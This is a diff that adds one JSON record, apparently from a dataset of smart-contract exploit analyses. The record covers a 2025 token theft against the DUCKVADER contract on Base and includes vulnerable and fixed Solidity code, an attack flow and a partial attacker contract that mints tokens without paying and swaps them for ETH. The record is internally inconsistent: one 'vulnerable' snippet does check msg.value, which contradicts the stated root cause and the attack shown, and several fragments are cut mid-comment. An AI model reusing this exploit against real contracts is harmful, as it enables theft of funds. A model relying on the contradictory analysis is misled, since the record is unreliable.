@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-03-07_DUCKVADER_FeeManipulation",
+ "source_file": "2025/2025-03-07_DUCKVADER_FeeManipulation.md",
+ "title": "DUCKVADER — Token Theft via Fee Manipulation Analysis",
+ "date": "2025-03-07",
+ "protocol": "DUCKVADER",
+ "chain": "Base",
+ "loss_raw": "~5 ETH",
+ "loss_usd": null,
+ "root_cause": "`buyTokens()` allows token purchase by bypassing the fee without validating `msg.value`",
+ "attack_tx": "0x9bb1401...",
+ "vulnerable_contract": "0xaa8f35183478b8eced5619521ac3eb3886e98c56",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no validation between msg.value and usdtAmount\nfunction buyTokens(uint256 usdtAmount) external payable {\n    // Trusts the usdtAmount parameter without comparing it to actual msg.value\n    uint256 tokenAmount = usdtAmount * RATE;\n    _mint(msg.sender, tokenAmount);  //",
+  "❌ Minting tokens without validation\n}\n\n//",
+  "// File: Contract.sol\ncontract DUCKVADER {\n    function buyTokens(uint256 amount) external payable {  // ❌ Vulnerability\n    require(msg.value >= amount * 1 ether); // Ensure sufficient ETH is sent\n\n    if (_balances[msg.sender] == 0){\n        _mint(msg.sender, (maxSupply * LIQUID_RATE) / MAX_PERCENTAGE);\n    }\n    \n    uint256 newBalance = _balances[msg.sender]; \n    newBalance += amount; \n    _balances[msg.sender] = newBalance;\n   \n   emit Transfer(address(0), msg.sender, amount); // Emit the transfer event\n}"
+ ],
+ "code_after": [
+  "✅ Correct code\nfunction buyTokens(uint256 usdtAmount) external payable {\n    uint256 expectedETH = usdtAmount * ETH_PRICE_PER_USDT;\n    require(msg.value >= expectedETH, \"Insufficient ETH sent\"); //",
+  "✅ Validation required\n    uint256 tokenAmount = usdtAmount * RATE;\n    _mint(msg.sender, tokenAmount);\n}"
+ ],
+ "steps": [
+  "► DUCKVADER tokens → WETH swap"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Deploy AttackContract\n  │\n  ├─[2]─► DUCKVADER.buyTokens(large usdtAmount) { msg.value: 0 }\n  │         └─► Mass token minting (no validation)\n  │\n  ├─[3]─► Uniswap V2 Router.swapExactTokensForETH()\n  │         └─► DUCKVADER tokens → WETH swap\n  │\n  └─[4]─► ~5 ETH profit captured",
+  "interface IDUCKVADER is IERC20 {\n    function buyTokens(uint256 usdtAmount) external payable;\n}\n\ncontract AttackContract {\n    IDUCKVADER constant duck = IDUCKVADER(DUCKVADER);\n    IUniswapV2Router constant router = IUniswapV2Router(UNISWAP_ROUTER);\n\n    function attack() external {\n        // [1] Purchase tokens with a large usdtAmount and no msg.value\n        // No actual ETH is paid, or only a minimum amount is sent\n        duck.buyTokens{value: 0}(1_000_000 * 1e18);\n\n        // [2] Swap the acquired tokens for ETH on Uniswap\n        duck.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(duck);\n        path[1] = wETH;\n        router.swapExactTokensForETH(\n            duck.balanceOf(address(this)),\n            0,\n    "
+ ]
+}
